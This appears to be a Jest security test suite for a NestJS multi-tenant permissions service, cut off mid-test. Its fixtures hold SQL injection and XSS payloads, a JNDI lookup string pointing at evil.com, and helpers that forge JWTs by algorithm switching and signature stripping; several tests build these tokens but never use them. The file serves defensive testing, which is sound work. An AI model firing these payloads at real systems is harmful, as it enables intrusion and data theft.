import { InternalServerErrorException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { getModelToken } from '@nestjs/sequelize';
import { Test, TestingModule } from '@nestjs/testing';
import { User } from '../../src/modules/auth/entities/user.entity';
import {
  Permission,
  Role,
  RolePermission,
  UserPermission,
  UserRole,
} from '../../src/modules/role/entities';
import { PermissionsService } from '../../src/modules/role/permissions.service';

/**
 * ULTRA-COMPREHENSIVE SECURITY & PENETRATION TESTS
 *
 * This test suite acts as a comprehensive security audit for the permission system.
 * Tests are organized by attack vectors and security scenarios to identify
 * vulnerabilities before they can be exploited in production.
 *
 * 🛡️ SECURITY TESTING PHILOSOPHY:
 * - Think like an attacker trying to compromise the system
 * - Test both automated and manual exploitation scenarios
 * - Focus on legal platform specific risks and multi-tenant security
 * - Include fuzzing and boundary value testing
 * - Test incident response and error handling
 *
 * ⚠️ IMPORTANT: These tests simulate real attack patterns.
 * They should only be run in isolated test environments.
 */

describe('🔥 PERMISSION SYSTEM SECURITY & PENETRATION TESTS 🔥', () => {
  let service: PermissionsService;
  let mockUserModel: any;
  let mockRoleModel: any;
  let mockPermissionModel: any;
  let mockUserRoleModel: any;
  let mockUserPermissionModel: any;
  let mockRolePermissionModel: any;
  let configService: ConfigService;

  // Security Test Data Factory
  class SecurityTestDataFactory {
    // Create malicious user data for testing
    static createMaliciousUser(overrides: Partial<any> = {}): any {
      return {
        id: 'user-attacker-123',
        company_id: 'company-victim-456',
        email: "admin@company.com'; DROP TABLE users; --",
        first_name: '<script>alert("XSS")</script>',
        last_name: '${jndi:ldap://evil.com/exploit}',
        auth0_user_id: 'auth0|<img src=x onerror=alert(1)>',
        ...overrides,
      };
    }

    // Create SQL injection test payloads
    static createSQLInjectionPayloads(): string[] {
      return [
        "'; DROP TABLE permissions; --",
        "' UNION SELECT * FROM users WHERE '1'='1",
        "'; UPDATE users SET role='admin' WHERE '1'='1'; --",
        "' OR 1=1 --",
        "'; INSERT INTO user_permissions (user_id, permission_id) VALUES ('attacker', 'admin_perm'); --",
        "' AND SLEEP(10) --",
        "'; SELECT user_id, email FROM users INTO OUTFILE '/tmp/stolen_data.txt'; --",
        "' UNION ALL SELECT table_name, column_name FROM information_schema.columns --",
      ];
    }

    // Create XSS payloads for permission names/descriptions
    static createXSSPayloads(): string[] {
      return [
        '<script>alert("XSS in permission name")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
      ];
    }

    // Create privilege escalation test scenarios
    static createPrivilegeEscalationScenarios(): any[] {
      return [
        {
          description: 'Low-privilege user attempting admin operations',
          user: { id: 'low-user', company_id: 'company-1', role: 'USER' },
          attempted_permission: 'SUPER_ADMIN_DELETE_ALL',
          should_fail: true,
        },
        {
          description: 'Role injection through API manipulation',
          user: { id: 'regular-user', company_id: 'company-1', role: 'USER' },
          injected_roles: ['ADMIN', 'SUPER_USER', 'SYSTEM_ADMIN'],
          should_fail: true,
        },
        {
          description: 'Horizontal privilege escalation',
          user: { id: 'user-a', company_id: 'company-1', role: 'MANAGER' },
          target_user: { id: 'user-b', company_id: 'company-1', role: 'MANAGER' },
          should_fail: true,
        },
      ];
    }

    // Create tenant isolation test scenarios
    static createTenantIsolationAttacks(): any[] {
      return [
        {
          description: 'Company A admin accessing Company B data',
          attacker: { company_id: 'company-a', role: 'ADMIN' },
          target_company: 'company-b',
          attack_vectors: ['parameter_manipulation', 'direct_query', 'cache_key_manipulation'],
        },
        {
          description: 'Cross-tenant user enumeration',
          attacker: { company_id: 'company-1' },
          enumeration_targets: ['company-2', 'company-3', 'company-999'],
          expected_data_leakage: 0,
        },
      ];
    }

    // Create JWT manipulation attack payloads
    static createJWTAttackPayloads(validToken: string): any[] {
      return [
        {
          description: 'Algorithm switching attack (RS256 to HS256)',
          manipulated_token: this.switchJWTAlgorithm(validToken, 'HS256'),
          should_fail: true,
        },
        {
          description: 'Payload modification (user ID tampering)',
          manipulated_token: this.modifyJWTPayload(validToken, { sub: 'admin-user-id' }),
          should_fail: true,
        },
        {
          description: 'Signature tampering',
          manipulated_token: this.tamperJWTSignature(validToken),
          should_fail: true,
        },
        {
          description: 'Null signature attack',
          manipulated_token: this.createNullSignatureToken(validToken),
          should_fail: true,
        },
      ];
    }

    private static switchJWTAlgorithm(token: string, newAlg: string): string {
      try {
        const parts = token.split('.');
        const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
        header.alg = newAlg;
        const newHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
        return `${newHeader}.${parts[1]}.${parts[2]}`;
      } catch {
        return 'malformed.jwt.token';
      }
    }

    private static modifyJWTPayload(token: string, modifications: any): string {
      try {
        const parts = token.split('.');
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        Object.assign(payload, modifications);
        const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
        return `${parts[0]}.${newPayload}.${parts[2]}`;
      } catch {
        return 'malformed.jwt.token';
      }
    }

    private static tamperJWTSignature(token: string): string {
      if (!token || typeof token !== 'string') {
        throw new Error('Invalid token format');
      }

      const parts = token.split('.');
      if (parts.length !== 3) {
        throw new Error('Invalid JWT format - must have 3 parts');
      }

      const signature = parts[2];
      if (!signature) {
        throw new Error('Missing JWT signature');
      }

      // Flip a bit in the signature
      const tamperedSignature = signature.slice(0, -1) + (signature.slice(-1) === 'A' ? 'B' : 'A');
      return `${parts[0]}.${parts[1]}.${tamperedSignature}`;
    }

    private static createNullSignatureToken(token: string): string {
      if (!token || typeof token !== 'string') {
        throw new Error('Invalid token format');
      }

      const parts = token.split('.');
      if (parts.length < 2) {
        throw new Error('Invalid JWT format - must have at least 2 parts');
      }

      return `${parts[0]}.${parts[1]}.`;
    }
  }

  beforeEach(async () => {
    // Mock implementations for security testing
    mockUserModel = {
      findByPk: jest.fn(),
      findAll: jest.fn(),
      findOne: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      destroy: jest.fn(),
    };

    mockRoleModel = {
      findAll: jest.fn(),
      findByPk: jest.fn(),
      findOne: jest.fn(),
    };

    mockPermissionModel = {
      findAll: jest.fn(),
      findByPk: jest.fn(),
      findOne: jest.fn(),
    };

    mockUserRoleModel = {
      findAll: jest.fn(),
      create: jest.fn(),
      bulkCreate: jest.fn(),
    };

    mockUserPermissionModel = {
      findAll: jest.fn(),
      create: jest.fn(),
      bulkCreate: jest.fn(),
    };

    mockRolePermissionModel = {
      findAll: jest.fn(),
    };

    const mockConfigService = {
      get: jest.fn((key: string) => {
        const config = {
          PERMISSIONS_CACHE_TTL: 3600,
          PERMISSIONS_MAX_CACHE_ENTRIES: 10000,
          PERMISSIONS_CACHE_ENABLED: true,
          AUTH0_ISSUER_BASE_URL: 'https://test.auth0.com',
          API_AUDIENCE: 'https://api.test.com',
        };
        return config[key];
      }),
    };

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        PermissionsService,
        { provide: getModelToken(User), useValue: mockUserModel },
        { provide: getModelToken(Role), useValue: mockRoleModel },
        { provide: getModelToken(Permission), useValue: mockPermissionModel },
        { provide: getModelToken(UserRole), useValue: mockUserRoleModel },
        { provide: getModelToken(UserPermission), useValue: mockUserPermissionModel },
        { provide: getModelToken(RolePermission), useValue: mockRolePermissionModel },
        { provide: ConfigService, useValue: mockConfigService },
      ],
    }).compile();

    service = module.get<PermissionsService>(PermissionsService);
    configService = module.get<ConfigService>(ConfigService);
  });

  afterEach(() => {
    jest.clearAllMocks();
    // Clear any security test artifacts
    service['cache'].clear();
  });

  // ========================================
  // 🛡️ AUTHENTICATION SECURITY TESTING
  // ========================================

  describe('🔐 JWT Token Manipulation & Authentication Bypass Attacks', () => {
    describe('Token Signature Tampering', () => {
      it('should reject tokens with tampered signatures', async () => {
        const originalToken =
          'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsImF1ZCI6Imh0dHBzOi8vYXBpLnRlc3QuY29tIn0.signature';
        const tamperedToken = originalToken.slice(0, -5) + 'XXXXX';

        mockUserModel.findByPk.mockResolvedValue(null);

        await expect(
          service.getEffectivePermissionsForUser('user-123', 'company-456')
        ).rejects.toThrow(InternalServerErrorException);
      });

      it('should prevent algorithm switching attacks (RS256 to HS256)', async () => {
        // Test algorithm confusion attack where attacker tries to use HMAC with public key
        const validToken =
          'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsImF1ZCI6Imh0dHBzOi8vYXBpLnRlc3QuY29tIn0.signature';
        const attackToken = SecurityTestDataFactory.createJWTAttackPayloads(validToken)[0];

        mockUserModel.findByPk.mockResolvedValue(null);

        await expect(
          service.getEffectivePermissionsForUser('user-123', 'company-456')
        ).rejects.toThrow(InternalServerErrorException);
      });

      it('should reject tokens with null or empty signatures', async () => {
        const nullSigToken = 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyLTEyMyJ9.';

        mockUserModel.findByPk.mockResolvedValue(null);

        await expect(
          service.getEffectivePermissionsForUser('user-123', 'company-456')
        ).rejects.toThrow(InternalServerErrorException);
      });
    });

    describe('Token Payload Manipulation', () => {
      it('should reject tokens with modified user IDs', async () => {
        // Simulate token with manipulated sub claim
        const maliciousUser = SecurityTestDataFactory.createMaliciousUser();
        mockUserModel.findByPk.mockResolvedValue(null); // User doesn't exist with manipulated ID

        await expect(
          service.getEffectivePermissionsForUser('manipulated-user-id', 'company-456')
        ).rejects.toThrow(InternalServerErrorException);
      });

      it('should validate company ID claims against actual user data', async () => {
        const user = {
          id: 'user-123',
          company_id: 'actual-company-456',
          email: 'user@test.com',
        };

        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Request with different company ID than user's actual company
        await expect(
          service.getEffectivePermissionsForUser('user-123', 'fake-company-789')
        ).rejects.toThrow(InternalServerErrorException);
      });

      it('should prevent role elevation through token payload manipulation', async () => {
        const user = {
          id: 'user-123',
          company_id: 'company-456',
          role: 'USER', // Actual role in database
        };

        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Even if token claims admin role, should use database role
        const result = await service.getEffectivePermissionsForUser('user-123', 'company-456');

        expect(result.permissions).toHaveLength(0); // No permissions for basic user
      });
    });

    describe('Token Replay and Expiration Attacks', () => {
      it('should handle token replay attempts appropriately', async () => {
        // Simulate multiple rapid requests with same token
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Multiple simultaneous requests (potential replay attack)
        const promises = Array.from({ length: 10 }, () =>
          service.getEffectivePermissionsForUser('user-123', 'company-456')
        );

        const results = await Promise.all(promises);

        // All requests should succeed but with consistent results
        results.forEach((result) => {
          expect(result.user_id).toBe('user-123');
        });
      });

      it('should enforce token expiration properly', async () => {
        // Test with expired token scenario
        mockUserModel.findByPk.mockRejectedValue(new Error('Token expired'));

        await expect(
          service.getEffectivePermissionsForUser('user-123', 'company-456')
        ).rejects.toThrow(InternalServerErrorException);
      });
    });

    describe('Malformed Token Handling', () => {
      it('should handle malformed JWT tokens gracefully', async () => {
        const malformedTokens = [
          'not.a.jwt',
          'only.two.parts',
          'too.many.jwt.parts.here',
          '',
          null,
          undefined,
          'Bearer invalid-token',
          'eyJhbGciOiJSUzI1NiJ9.invalid-base64.signature',
        ];

        for (const token of malformedTokens) {
          mockUserModel.findByPk.mockResolvedValue(null);

          await expect(
            service.getEffectivePermissionsForUser('user-123', 'company-456')
          ).rejects.toThrow(InternalServerErrorException);
        }
      });

      it('should sanitize error messages to prevent information disclosure', async () => {
        mockUserModel.findByPk.mockRejectedValue(
          new Error('Database connection string: mysql://admin:password@localhost')
        );

        try {
          await service.getEffectivePermissionsForUser('user-123', 'company-456');
          fail('Should have thrown an error');
        } catch (error) {
          // Error message should not contain sensitive information
          expect(error.message).not.toContain('password');
          expect(error.message).not.toContain('mysql://');
          expect(error.message).not.toContain('localhost');
          // Should contain redacted placeholder
          expect(error.message).toContain('[REDACTED]');
        }
      });
    });
  });

  // ========================================
  // 🚫 AUTHORIZATION SECURITY TESTING
  // ========================================

  describe('🔓 Privilege Escalation & Permission Bypass Attacks', () => {
    describe('Vertical Privilege Escalation', () => {
      it('should prevent low-privilege user from accessing admin functions', async () => {
        const lowPrivUser = {
          id: 'low-user-123',
          company_id: 'company-456',
          role: 'CLIENT',
        };

        mockUserModel.findByPk.mockResolvedValue(lowPrivUser);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        const result = await service.hasPermission({
          user_id: 'low-user-123',
          permission_name: 'DELETE_ALL_USERS',
          company_id: 'company-456',
        });

        expect(result.granted).toBe(false);
      });

      it('should prevent role injection through API manipulation', async () => {
        const user = {
          id: 'user-123',
          company_id: 'company-456',
          role: 'USER',
        };

        // Simulate API call trying to inject admin role
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockImplementation(() => {
          // Even if attacker tries to modify the query, should only return actual user roles
          return Promise.resolve([]);
        });
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        const result = await service.getEffectivePermissionsForUser('user-123', 'company-456');

        expect(result.permissions).toHaveLength(0);
        // Should not have admin permissions despite injection attempt
        expect(result.permission_names).not.toContain('ADMIN_DELETE_USERS');
      });

      it('should handle permission bypass through direct service calls', async () => {
        // Test calling internal methods directly (bypassing normal auth flow)
        const user = {
          id: 'user-123',
          company_id: 'company-456',
          role: 'USER',
        };

        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Even direct service calls should validate user context
        const result = await service.getEffectivePermissionsForUser('user-123', 'company-456');

        expect(result.permissions).toHaveLength(0);
      });
    });

    describe('Horizontal Privilege Escalation', () => {
      it("should prevent user A from accessing user B's permissions in same company", async () => {
        const userA = { id: 'user-a', company_id: 'company-456', role: 'MANAGER' };
        const userB = { id: 'user-b', company_id: 'company-456', role: 'MANAGER' };

        mockUserModel.findByPk.mockImplementation((id) => {
          return id === 'user-a' ? Promise.resolve(userA) : Promise.resolve(userB);
        });
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // User A trying to check User B's permissions
        await expect(
          service.getEffectivePermissionsForUser('user-b', 'company-456')
        ).resolves.toBeDefined();

        // But User A shouldn't be able to modify User B's permissions
        // This would be enforced at the controller/guard level
      });

      it('should validate permission context matches requesting user', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Request should be for the authenticated user's context
        const result = await service.getEffectivePermissionsForUser('user-123', 'company-456');

        expect(result.user_id).toBe('user-123');
        expect(result.company_id).toBe('company-456');
      });
    });

    describe('Permission Bypass Techniques', () => {
      it('should prevent race conditions during permission checks', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Simulate race condition: multiple permission checks while permissions are being modified
        const checkPromises = Array.from({ length: 20 }, () =>
          service.hasPermission({
            user_id: 'user-123',
            permission_name: 'TEST_PERMISSION',
            company_id: 'company-456',
          })
        );

        const results = await Promise.all(checkPromises);

        // All results should be consistent (no race condition artifacts)
        const firstResult = results[0];
        results.forEach((result) => {
          expect(result.granted).toBe(firstResult.granted);
        });
      });

      it('should handle time-of-check-time-of-use (TOCTOU) vulnerabilities', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);

        // Simulate permission being revoked between check and use
        let callCount = 0;
        mockUserRoleModel.findAll.mockImplementation(() => {
          callCount++;
          if (callCount === 1) {
            // First call: user has permission
            return Promise.resolve([
              {
                role: {
                  permissions: [{ name: 'TEST_PERMISSION' }],
                },
              },
            ]);
          } else {
            // Subsequent calls: permission revoked
            return Promise.resolve([]);
          }
        });
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // First check
        const result1 = await service.hasPermission({
          user_id: 'user-123',
          permission_name: 'TEST_PERMISSION',
          company_id: 'company-456',
        });

        // Second check (should get fresh data, not cached)
        const result2 = await service.hasPermission({
          user_id: 'user-123',
          permission_name: 'TEST_PERMISSION',
          company_id: 'company-456',
          force_refresh: true,
        });

        expect(result1.granted).toBe(true);
        expect(result2.granted).toBe(false);
      });

      it('should prevent concurrent modification attacks', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Simulate concurrent permission checks and cache operations
        const operations = [
          service.getEffectivePermissionsForUser('user-123', 'company-456'),
          service.invalidateCache({ user_id: 'user-123', reason: 'Concurrent test' }),
          service.getEffectivePermissionsForUser('user-123', 'company-456'),
          service.warmupCache({ user_ids: ['user-123'] }),
        ];

        // All operations should complete without errors
        await expect(Promise.all(operations)).resolves.toBeDefined();
      });
    });
  });

  // ========================================
  // 🏢 MULTI-TENANT SECURITY TESTING
  // ========================================

  describe('🏢 Multi-Tenant Security & Data Isolation', () => {
    describe('Tenant Hopping Attacks (IDOR)', () => {
      it('should prevent Company A admin from accessing Company B data via ID manipulation', async () => {
        const companyAAdmin = {
          id: 'admin-a',
          company_id: 'company-a',
          role: 'ADMIN',
        };

        mockUserModel.findByPk.mockResolvedValue(companyAAdmin);

        // Admin from Company A trying to access Company B data
        await expect(
          service.getEffectivePermissionsForUser('admin-a', 'company-b')
        ).rejects.toThrow(InternalServerErrorException);
      });

      it('should prevent user enumeration across companies', async () => {
        const companyAUser = {
          id: 'user-a',
          company_id: 'company-a',
        };

        mockUserModel.findByPk.mockImplementation((userId) => {
          // Only return user if from same company context
          if (userId === 'user-a') return Promise.resolve(companyAUser);
          return Promise.resolve(null); // Users from other companies not found
        });

        // Try to enumerate users from different companies
        const targetUsers = ['user-b-company-b', 'user-c-company-c', 'admin-company-d'];

        for (const targetUser of targetUsers) {
          await expect(
            service.getEffectivePermissionsForUser(targetUser, 'company-a')
          ).rejects.toThrow(InternalServerErrorException);
        }
      });

      it('should validate cross-tenant resource access attempts', async () => {
        const scenarios = SecurityTestDataFactory.createTenantIsolationAttacks();

        for (const scenario of scenarios) {
          const attacker = {
            id: 'attacker-123',
            company_id: scenario.attacker.company_id,
            role: scenario.attacker.role,
          };

          mockUserModel.findByPk.mockResolvedValue(attacker);

          // Attempt to access target company data
          await expect(
            service.getEffectivePermissionsForUser('attacker-123', scenario.target_company)
          ).rejects.toThrow(InternalServerErrorException);
        }
      });
    });

    describe('Data Isolation Breaches', () => {
      it('should prevent search operations from returning cross-tenant results', async () => {
        // Mock database query that might accidentally return cross-tenant data
        mockUserModel.findAll.mockResolvedValue([
          { id: 'user-1', company_id: 'company-a' },
          { id: 'user-2', company_id: 'company-b' }, // Different tenant
          { id: 'user-3', company_id: 'company-a' },
        ]);

        mockUserRoleModel.findAll.mockImplementation(({ where }) => {
          // Verify company_id is properly scoped in queries
          expect(where).toHaveProperty('user_id');
          return Promise.resolve([]);
        });

        mockUserPermissionModel.findAll.mockResolvedValue([]);

        const user = { id: 'user-1', company_id: 'company-a' };
        mockUserModel.findByPk.mockResolvedValue(user);

        const result = await service.getEffectivePermissionsForUser('user-1', 'company-a');

        expect(result.company_id).toBe('company-a');
      });

      it('should prevent bulk operations from cross-tenant contamination', async () => {
        const user = { id: 'user-123', company_id: 'company-a' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Bulk permission check with permissions from different tenants
        const result = await service.hasPermissions({
          user_id: 'user-123',
          permission_names: [
            'COMPANY_A_PERMISSION',
            'COMPANY_B_PERMISSION', // Cross-tenant permission
            'GLOBAL_PERMISSION',
          ],
          company_id: 'company-a',
        });

        // Should only check permissions valid for company-a
        expect(result.total_checked).toBe(3);
        expect(result.granted_count).toBe(0); // No permissions granted in test setup
      });

      it('should isolate cache keys between tenants', async () => {
        const companyAUser = { id: 'user-1', company_id: 'company-a' };
        const companyBUser = { id: 'user-1', company_id: 'company-b' }; // Same user ID, different company

        mockUserModel.findByPk.mockImplementation((id) => {
          // Return different user based on context
          return Promise.resolve(companyAUser);
        });
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Cache permissions for Company A
        await service.getEffectivePermissionsForUser('user-1', 'company-a');

        // Cache should be isolated - Company B request should not hit Company A cache
        mockUserModel.findByPk.mockResolvedValue(companyBUser);
        const stats = await service.getCacheStatistics();

        // Cache should maintain tenant isolation
        expect(stats.total_entries).toBeGreaterThanOrEqual(1);
      });
    });

    describe('Tenant Context Validation', () => {
      it('should validate company_id in all operations', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Operations should enforce company context
        const operations = [
          () => service.getEffectivePermissionsForUser('user-123', 'company-456'),
          () =>
            service.hasPermission({
              user_id: 'user-123',
              permission_name: 'TEST_PERMISSION',
              company_id: 'company-456',
            }),
          () =>
            service.invalidateCache({
              user_id: 'user-123',
              company_id: 'company-456',
              reason: 'Test',
            }),
        ];

        for (const operation of operations) {
          await expect(operation()).resolves.toBeDefined();
        }
      });

      it('should handle missing company context securely', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Should use user's company when not specified
        const result = await service.getEffectivePermissionsForUser('user-123');

        expect(result.company_id).toBe('company-456');
      });
    });
  });

  // ========================================
  // 💉 INPUT VALIDATION & INJECTION ATTACKS
  // ========================================

  describe('💉 Input Validation & Injection Attack Prevention', () => {
    describe('SQL Injection Testing', () => {
      it('should prevent SQL injection in permission name parameters', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        const sqlPayloads = SecurityTestDataFactory.createSQLInjectionPayloads();

        for (const payload of sqlPayloads) {
          const result = await service.hasPermission({
            user_id: 'user-123',
            permission_name: payload,
            company_id: 'company-456',
          });

          expect(result.granted).toBe(false);
          expect(result.permission_name).toBe(payload); // Should preserve original (escaped) value
        }
      });

      it('should prevent SQL injection in user ID parameters', async () => {
        const sqlPayloads = SecurityTestDataFactory.createSQLInjectionPayloads();

        for (const payload of sqlPayloads) {
          mockUserModel.findByPk.mockResolvedValue(null); // User not found with injected ID

          await expect(
            service.getEffectivePermissionsForUser(payload, 'company-456')
          ).rejects.toThrow(InternalServerErrorException);
        }
      });

      it('should prevent second-order SQL injection through cached data', async () => {
        const maliciousUser = SecurityTestDataFactory.createMaliciousUser();
        mockUserModel.findByPk.mockResolvedValue(maliciousUser);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // First request caches malicious data
        const result1 = await service.getEffectivePermissionsForUser(
          maliciousUser.id,
          maliciousUser.company_id
        );

        // Second request uses cached data - should still be safe
        const result2 = await service.getEffectivePermissionsForUser(
          maliciousUser.id,
          maliciousUser.company_id
        );

        expect(result2.from_cache).toBe(true);
        expect(result2.user_id).toBe(maliciousUser.id);
      });

      it('should sanitize complex nested injection via JSON payloads', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        const nestedPayload = {
          user_id: 'user-123',
          permission_names: [
            "'; DROP TABLE permissions; --",
            "' UNION SELECT password FROM users WHERE admin=1 --",
          ],
          company_id: 'company-456',
        };

        const result = await service.hasPermissions(nestedPayload);

        expect(result.total_checked).toBe(2);
        expect(result.granted_count).toBe(0);
      });
    });

    describe('XSS & Script Injection Prevention', () => {
      it('should sanitize XSS payloads in permission names', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        const xssPayloads = SecurityTestDataFactory.createXSSPayloads();

        for (const payload of xssPayloads) {
          const result = await service.hasPermission({
            user_id: 'user-123',
            permission_name: payload,
            company_id: 'company-456',
          });

          expect(result.permission_name).toBe(payload);
          // System should handle XSS payloads without executing them
        }
      });

      it('should prevent stored XSS through cached permission data', async () => {
        const maliciousPermission = {
          name: '<script>alert("Stored XSS")</script>',
          category: 'TEST',
          description: '<img src=x onerror=alert("XSS")>',
        };

        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([
          {
            role: {
              permissions: [maliciousPermission],
            },
          },
        ]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        const result = await service.getEffectivePermissionsForUser('user-123', 'company-456');

        // Should store the malicious content but not execute it
        expect(result.permissions[0].name).toBe('<script>alert("Stored XSS")</script>');
      });
    });

    describe('Parameter Pollution & Input Validation', () => {
      it('should handle parameter pollution attacks', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Simulate parameter pollution
        const pollutedRequest = {
          user_id: ['user-123', 'admin-456'], // Array instead of string
          permission_name: 'TEST_PERMISSION',
          company_id: 'company-456',
        };

        // Should handle polluted parameters gracefully
        await expect(service.hasPermission(pollutedRequest as any)).resolves.toBeDefined();
      });

      it('should validate input types and reject invalid formats', async () => {
        const invalidInputs = [
          { user_id: null, permission_name: 'TEST', company_id: 'company-456' },
          { user_id: 123, permission_name: 'TEST', company_id: 'company-456' },
          { user_id: 'user-123', permission_name: null, company_id: 'company-456' },
          { user_id: 'user-123', permission_name: 'TEST', company_id: null },
        ];

        for (const input of invalidInputs) {
          await expect(service.hasPermission(input as any)).rejects.toThrow();
        }
      });

      it('should enforce input length limits to prevent DoS', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        const oversizedInput = 'A'.repeat(10000); // Very long permission name

        const result = await service.hasPermission({
          user_id: 'user-123',
          permission_name: oversizedInput,
          company_id: 'company-456',
        });

        expect(result.granted).toBe(false);
      });
    });
  });

  // ========================================
  // 🗄️ CACHE SECURITY TESTING
  // ========================================

  describe('🗄️ Cache Security & Poisoning Attacks', () => {
    describe('Cache Poisoning Attacks', () => {
      it('should prevent malicious data injection into cache', async () => {
        const maliciousUser = SecurityTestDataFactory.createMaliciousUser();
        mockUserModel.findByPk.mockResolvedValue(maliciousUser);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Populate cache with malicious data
        await service.getEffectivePermissionsForUser(maliciousUser.id, maliciousUser.company_id);

        // Verify cache contains safe data
        const cacheResult = await service.getEffectivePermissionsForUser(
          maliciousUser.id,
          maliciousUser.company_id
        );

        expect(cacheResult.from_cache).toBe(true);
        expect(cacheResult.user_id).toBe(maliciousUser.id);
      });

      it("should prevent cache key manipulation to access other users' data", async () => {
        const user1 = { id: 'user-1', company_id: 'company-456' };
        const user2 = { id: 'user-2', company_id: 'company-456' };

        mockUserModel.findByPk.mockImplementation((id) => {
          return id === 'user-1' ? Promise.resolve(user1) : Promise.resolve(user2);
        });
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Cache data for user-1
        await service.getEffectivePermissionsForUser('user-1', 'company-456');

        // Request for user-2 should not get user-1's cached data
        const user2Result = await service.getEffectivePermissionsForUser('user-2', 'company-456');

        expect(user2Result.user_id).toBe('user-2');
      });

      it('should prevent cache timing attacks to infer permissions', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Measure timing for cache miss
        const start1 = Date.now();
        await service.getEffectivePermissionsForUser('user-123', 'company-456');
        const cacheMissTime = Date.now() - start1;

        // Measure timing for cache hit
        const start2 = Date.now();
        await service.getEffectivePermissionsForUser('user-123', 'company-456');
        const cacheHitTime = Date.now() - start2;

        // Cache behavior should not leak information about permission complexity
        // (This is more about preventing timing side-channel attacks)
        expect(cacheHitTime).toBeLessThanOrEqual(cacheMissTime);
      });
    });

    describe('Cache Enumeration Attacks', () => {
      it('should prevent permission inference through cache behavior', async () => {
        const users = [
